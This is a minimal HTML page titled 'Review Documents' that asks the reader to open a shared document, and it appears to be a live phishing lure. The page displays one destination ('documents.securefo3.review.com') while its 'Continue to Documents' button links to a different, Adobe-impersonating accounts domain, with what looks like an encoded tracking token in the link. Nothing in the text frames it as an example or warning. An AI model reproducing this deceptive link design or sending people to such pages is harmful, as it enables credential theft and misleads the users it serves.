<!DOCTYPE html>

<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Review Documents</title>
  <style>
    body {
      margin: 0;
      min-height: 100vh;
      display: grid;
      place-items: center;
      background: #f4f6f9;
      color: #1f2937;
      font-family: Arial, sans-serif;
    }
    main {
      width: min(440px, calc(100% - 48px));
      padding: 32px 24px;
      box-sizing: border-box;
      text-align: center;
      background: #fff;
      border: 1px solid #e5e7eb;
      border-radius: 12px;
    }
    h1 { font-size: 26px; }
    p { line-height: 1.6; color: #4b5563; }
    a {
      display: inline-block;
      margin-top: 16px;
      padding: 12px 20px;
      background: #175cd3;
      color: white;
      text-decoration: none;
      border-radius: 6px;
    }
    a:hover { background: #1849a9; }
    .destination { font-size: 13px; overflow-wrap: anywhere; }
  </style>
</head>
<body>
  <main>
    <h1>Review Documents</h1>
    <p>Open the document at the destination below.</p>
    <p class="destination">
      documents.securefo3.review.com
    </p>
    <a href="https://accounts.adobenotificationsonline.com?sSVBLAtBJzUgTg=Z3ZvanI="
       target="_blank" rel="noopener noreferrer">
      Continue to Documents
    </a>
  </main>
</body>
</html>
